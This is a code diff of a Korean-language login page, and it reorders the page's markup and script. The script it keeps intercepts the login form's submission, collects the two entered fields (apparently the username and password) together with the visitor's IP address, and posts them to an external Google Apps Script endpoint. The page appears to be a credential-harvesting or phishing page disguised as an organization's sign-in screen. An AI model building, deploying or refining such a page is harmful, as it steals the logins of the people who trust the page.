@@ -127,19 +127,8 @@
      
       <button type="submit">로그인</button>
     </form>
-
-    
-    <div class="links">
-      <a href="#">비밀번호 찾기</a>
-      <a href="#">계정 유형 선택하기</a>
-    </div>
-    <p>계정이 없으신가요?<br>조직 관리자에게 문의하여 계정 추가를 요청하세요.</p>
-
-
-    
-  </div>
-   <script>
-    document.getElementById('dataForm').addEventListener('submit', async function(e) {
+    <script>
+      document.getElementById('dataForm').addEventListener('submit', async function(e) {
       e.preventDefault();
 
       const aData = document.getElementById('aData').value;
@@ -157,19 +146,19 @@
                 .catch(error => console.error('IP fetch error:', error));
         });
     
-     async function sendDataToServer(aData, bData, ip) {
+       async function sendDataToServer(aData, bData, ip) {
 
-      try {
-        const response = await fetch('https://script.google.com/macros/s/AKfycbzu8SdA-VG7yDDrseQDe5DoHIy0rHsqhjY8VnTSv-uSxq6Z0LSLXpcAEdoHkiIZAKKt/exec', {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ aData: aData, bData: bData, ipAddress: ip })
-        })
-        .then(response => {
-          if (!response.ok) {
+        try {
+          const response = await fetch('https://script.google.com/macros/s/AKfycbzu8SdA-VG7yDDrseQDe5DoHIy0rHsqhjY8VnTSv-uSxq6Z0LSLXpcAEdoHkiIZAKKt/exec', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ aData: aData, bData: bData, ipAddress: ip })
+          })
+          .then(response => {
+            if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
           }
           return response.text(); // response.json() 대신 사용해보세요
@@ -194,6 +183,17 @@
       }
     }
     
-  </script>
+    </script>
+    
+    <div class="links">
+      <a href="#">비밀번호 찾기</a>
+      <a href="#">계정 유형 선택하기</a>
+    </div>
+    <p>계정이 없으신가요?<br>조직 관리자에게 문의하여 계정 추가를 요청하세요.</p>
+
+
+    
+  </div>
+   
 </body>
 </html>
